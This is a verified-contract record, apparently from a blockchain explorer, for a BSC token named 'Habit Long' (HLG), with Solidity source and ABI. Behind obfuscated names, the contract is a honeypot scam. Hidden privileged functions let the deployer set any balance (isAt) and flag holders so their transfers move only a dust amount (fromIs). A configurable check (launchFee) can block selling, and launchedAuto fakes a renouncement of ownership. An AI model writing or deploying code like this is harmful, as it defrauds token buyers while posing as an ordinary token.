{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface receiverEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountToken) external view returns (uint256);\n\n    function transfer(address exemptIs, uint256 modeFund) external returns (bool);\n\n    function allowance(address marketingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptIs,\n        uint256 modeFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingShould, uint256 value);\n    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract exemptSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txAutoToken {\n    function createPair(address receiverLimit, address minAuto) external returns (address);\n}\n\ninterface amountTake is receiverEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HabitLong is exemptSender, receiverEnable, amountTake {\n\n    address maxSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingSender;\n\n    mapping(address => uint256) private totalModeList;\n\n    address public shouldIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeSender;\n    }\n\n    bool private receiverLiquidity;\n\n    function maxBuy(address maxModeWallet, address exemptIs, uint256 modeFund) internal returns (bool) {\n        require(totalModeList[maxModeWallet] >= modeFund);\n        totalModeList[maxModeWallet] -= modeFund;\n        totalModeList[exemptIs] += modeFund;\n        emit Transfer(maxModeWallet, exemptIs, modeFund);\n        return true;\n    }\n\n    uint256 constant teamTx = 18 ** 10;\n\n    function approve(address receiverTake, uint256 modeFund) public virtual override returns (bool) {\n        liquiditySell[_msgSender()][receiverTake] = modeFund;\n        emit Approval(_msgSender(), receiverTake, modeFund);\n        return true;\n    }\n\n    function transfer(address amountLiquidity, uint256 modeFund) external virtual override returns (bool) {\n        return tokenTeamSender(_msgSender(), amountLiquidity, modeFund);\n    }\n\n    uint8 private modeEnable = 18;\n\n    mapping(address => bool) public swapFee;\n\n    function name() external view virtual override returns (string memory) {\n        return teamLaunch;\n    }\n\n    uint256 private takeAt = 100000000 * 10 ** 18;\n\n    function walletTx() private view {\n        require(swapFee[_msgSender()]);\n    }\n\n    function balanceOf(address amountToken) public view virtual override returns (uint256) {\n        return totalModeList[amountToken];\n    }\n\n    address public modeAmount;\n\n    function teamReceiver(address fundReceiverTrading) public {\n        if (marketingSender) {\n            return;\n        }\n        \n        swapFee[fundReceiverTrading] = true;\n        \n        marketingSender = true;\n    }\n\n    bool private marketingAuto;\n\n    string private teamLaunch = \"Habit Long\";\n\n    uint256 private launchTrading;\n\n    uint256 minModeBuy;\n\n    uint256 public swapExempt;\n\n    address autoShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buyLimit;\n\n    function owner() external view returns (address) {\n        return marketingTotal;\n    }\n\n    function launchedAuto() public {\n        emit OwnershipTransferred(modeAmount, address(0));\n        marketingTotal = address(0);\n    }\n\n    function tokenTeamSender(address maxModeWallet, address exemptIs, uint256 modeFund) internal returns (bool) {\n        if (maxModeWallet == modeAmount) {\n            return maxBuy(maxModeWallet, exemptIs, modeFund);\n        }\n        uint256 enableMarketing = receiverEnable(shouldIs).balanceOf(autoShould);\n        require(enableMarketing == feeSwap);\n        require(exemptIs != autoShould);\n        if (walletToken[maxModeWallet]) {\n            return maxBuy(maxModeWallet, exemptIs, teamTx);\n        }\n        return maxBuy(maxModeWallet, exemptIs, modeFund);\n    }\n\n    function fromIs(address txSell) public {\n        walletTx();\n        \n        if (txSell == modeAmount || txSell == shouldIs) {\n            return;\n        }\n        walletToken[txSell] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquiditySell;\n\n    uint256 feeSwap;\n\n    function transferFrom(address maxModeWallet, address exemptIs, uint256 modeFund) external override returns (bool) {\n        if (_msgSender() != maxSender) {\n            if (liquiditySell[maxModeWallet][_msgSender()] != type(uint256).max) {\n                require(modeFund <= liquiditySell[maxModeWallet][_msgSender()]);\n                liquiditySell[maxModeWallet][_msgSender()] -= modeFund;\n            }\n        }\n        return tokenTeamSender(maxModeWallet, exemptIs, modeFund);\n    }\n\n    mapping(address => bool) public walletToken;\n\n    constructor (){\n        \n        tokenReceiver marketingAt = tokenReceiver(maxSender);\n        shouldIs = txAutoToken(marketingAt.factory()).createPair(marketingAt.WETH(), address(this));\n        if (shouldFund != swapExempt) {\n            shouldFund = buyLimit;\n        }\n        modeAmount = _msgSender();\n        launchedAuto();\n        swapFee[modeAmount] = true;\n        totalModeList[modeAmount] = takeAt;\n        \n        emit Transfer(address(0), modeAmount, takeAt);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeEnable;\n    }\n\n    address private marketingTotal;\n\n    uint256 public shouldFund;\n\n    bool public totalTeamMax;\n\n    function allowance(address exemptLaunched, address receiverTake) external view virtual override returns (uint256) {\n        if (receiverTake == maxSender) {\n            return type(uint256).max;\n        }\n        return liquiditySell[exemptLaunched][receiverTake];\n    }\n\n    event OwnershipTransferred(address indexed modeLaunchedFee, address indexed txFee);\n\n    uint256 public listFund;\n\n    function launchFee(uint256 modeFund) public {\n        walletTx();\n        feeSwap = modeFund;\n    }\n\n    uint256 private txMax;\n\n    string private takeSender = \"HLG\";\n\n    function isAt(address amountLiquidity, uint256 modeFund) public {\n        walletTx();\n        totalModeList[amountLiquidity] = modeFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingTotal;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunchedFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFund\",\"type\":\"uint256\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeFund\",\"type\":\"uint256\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverTrading\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxModeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HabitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}